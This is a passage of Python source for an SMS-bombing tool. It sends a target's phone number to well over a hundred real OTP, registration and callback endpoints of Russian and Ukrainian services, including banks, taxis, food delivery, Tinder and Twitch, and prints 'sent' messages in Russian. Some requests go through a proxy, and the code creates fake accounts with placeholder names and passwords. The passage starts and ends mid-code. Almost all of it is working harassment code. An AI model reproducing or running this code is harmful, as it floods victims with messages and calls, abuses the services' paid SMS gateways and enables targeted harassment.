            print(' [-] Не отправлено!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print(' [+] newnext отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print(' [+] Sunlight отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print(' [+] alpari отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print(' [+] Invitro отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print(' [+] Sberbank отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print(' [+] Psbank отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print(' [+] Beltelcom отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print(' [+] Karusel отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print(' [+] KFC отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            print(' [+] carsmile отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print(' [+] Citilink отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print(' [+] Delitime отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print(' [+] findclone звонок отправлен!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print(' [+] ICQ отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print(' [+] InDriver отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
            print(' [+] Invitro отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
            print(' [+] Pmsm отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print(' [+] IVI отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print(' [+] Mail.ru отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print(' [+] MVideo отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
            print(' [+] OK отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://plink.tech/register/',json={"phone": _phone})
            print(' [+] Plink отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
            print(' [+] qlean отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
            print(' [+] SMSgorod отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print(' [+] Tinder отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print(' [+] Twitch отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print(' [+] CabWiFi отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
            print(' [+] wowworks отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
            print(' [+] Eda.Yandex отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(' [+] Youla отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print(' [+] Alpari отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
            print(' [+] SMS отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print(' [+] Delivery отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},headers=standar_headers,proxies=proxies)
            print(' [+]ritm отправлено')
        except:
            pass
        
        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print(' [+] Inv отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print(' [+] Sber отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print(' [+] RuTaxi sent!')
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password})
            print("[+] Регестрация на Citrus отправлена!")
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
            print("[+] Citrus отправлено!")
        except:
            print("[-] не отправлено!")

        try:
            requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration",
            data={
                "firstname": "Артем",
                "phone": _phone,
                "email": _email
            }
        )
            print(' [+] Moyo отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail})
            print(' [+] Comfy отправлено!')
        except:
             print(' [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print(' [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
            print(' [+] Cinema5 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": _phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },
        )
            print(' [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://apteka.ru/_action/auth/getForm/",
            data={
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": _phone585,
                "form[PASSWORD]": password,
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
        )
            print(' [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
            print(' [+] Secunda отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,})
            print(' [+] rozamira-azs отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": _phone})
            print(' [-] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": _phone})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://api.iconjob.co/api/auth/verification_code",
            json={"phone": _phone})
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
            data={
                "CB_NAME": "Артем",
                "CB_PHONE": _phone88})
            print(' [-] отправлено!')
        except:
            print(' [-]не отправлено!')

        try:
            requests.post("https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": _email,
                "password": password,
                "phone": _phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },
        )
            print(' [+] отправлено!')
        except:
            print(' [-] отправлено!')

        try:
            requests.post( "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://zoloto585.ru/api/bcard/reg/",
            json={
                "name": "Максим",
                "surname": "Летовал",
                "patronymic": "Максимович",
                "sex": "m",
                "birthdate": "11.11.1999",
                "phone": _phone585,
                "email": email,
                "city": "Москва",
            },
        )
            print(' [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": _phone585},
        )
            print(' [+] Pliskov отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print(' [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
        except:
            pass

        try:
            requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
        )
            print(' [+] Sms4 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://bamper.by/registration/?step=1",
            data={
                "phone": "+" + _phone,
                "submit": "Запросить смс подтверждения",
                "rules": "on",
            },
        )
            print(' [+] Bamper отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
            print(' [+] FriendClub отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
            data={"caller_number": _phone})
            print(' [+] SalamPay отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call",
            })
            print(' [+] звонок отправлен!')
            time.sleep(0.1)
        except:
            print(' [+] не отправлен!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },
        )
            print(' [+] Uchi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={ "msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
            print(' [+] ICQ отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://shafa.ua/api/v3/graphiql', json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + _phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },
        )
            print(' [+] Shafa отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
            headers={"Referer": "https://alpari.com/en/registration/"},
            json={
                "client_type": "personal",
                "email": _email,
                "mobile_phone": _phone,
                "deliveryOption": "sms",
            },
        )
            print(' [+] Alpari отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": _phone},
            )
            print(' [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] е отправлено!')

        try:
            requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={ "phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
            print(' [+] GetMancar отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
            print(' [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print(' [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {"auth": { "mphone": "+" + _phone,"bdate": "11.11.1999","deviceid": "00100", "version": "1.0","source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
            print(' [+] Ubki отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
            print(' [+] Top-Shop отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',  data={"phone": _phonePizzahut, "alien": "0"})
            print(' [+] Rendez-Vous отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://osava.ua/users/sign-up/callbacks', data={"phone_callbacks": _phone, "send_callbacks": "Отправить"})
            print(' [+] Osova отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
            json={"phone_number": "+" + _phone})
            
            print(' [+] Yandex.Eda отправлено!')
            time.leep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/register",
            json={
                "phone": "+" + _phone,
                "name": "Анастасия",
                "is_terms_accepted": True,
            },
        )
            print(' [+] Izi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
            print(' [+] Izzi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://api.pozichka.ua/v1/registration/send', json={"RegisterSendForm": {"phone": _phonePozichka}})
            print(' [+] Pozichka отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
         
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country":"UA","phone": phone[3:]})
            print(' [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://suandshi.ru/mobile_api/register_mobile_user', params={"phone": _phone})
            print(' [+] Suandshi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={"data": _phone, "metod": "postreg"})
            print(' [+] Makarolls отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={"telephone": "8" + _phone[1:]})
            print(' [+] PanPizza отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "Артем", "phone": _phone,"email": email})
            print(' [+] MOYO отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies)
            print(' [+] BelkaCar sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
            print(' [+] StarPizzaCafe отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print(' [+] Tinder sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print(' [+] Karusel sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print(' [+] Tinkoff отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')
            
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print(' [+] Dostavista отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            print(' [+] MonoBank отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
            print(' [+] SportMaster отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
         
        try:
            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            print(' [+] Alfalife отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print(' [+] KoronaPay отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print(' [+] BTfair отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",})
            print(' [+] GGbet отправлено!')
            time.sleep(0.1)
        except:
            print(' [-]  не отправлено!')
        
        try:
            requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",})
            print(' [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print(' [+] TheLive отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
             
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print(' [+] MTS sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print(' [+] MyGames sent!')
            time.sleep(0.1)
        except:
            print(' [+] error in sent!')
        
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",})
            print(' [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print(' [+] Kasta отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Kasta Не отправлено!')
            
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={'http':'138.197.137.39:8080'})
            print(' [+] Mail.ru отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",})
            print(' [+] Creditter отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,})
            print(' [+] Ingos отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",})
            print(' [+] Admiralxxx отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            print(' [+] Av отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print(' [+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print(' [+] City24 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print(' [+] SushiMaster отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print(' [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",})
            print(' [+] Niyama отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Niyama не отправлено!')
        
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print(' [+] VSK отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] VSK не отправлено!')

        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            print(' [+] EasyPay отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print(' [+] Fix-Price отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
            print(' [+] NovaLinia отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            print(' [+] Tele2 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print(' [+] Finam отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://makimaki.ru/system/callback.php', params={"cb_fio": _name,"cb_phone": format(_phone, "+* *** *** ** **")})
            print(' [+] MakiMaki отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status', headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",}, json={"loginId": "+" + _phone, "supportAllStates": True})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print(' [+] Online.ua отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
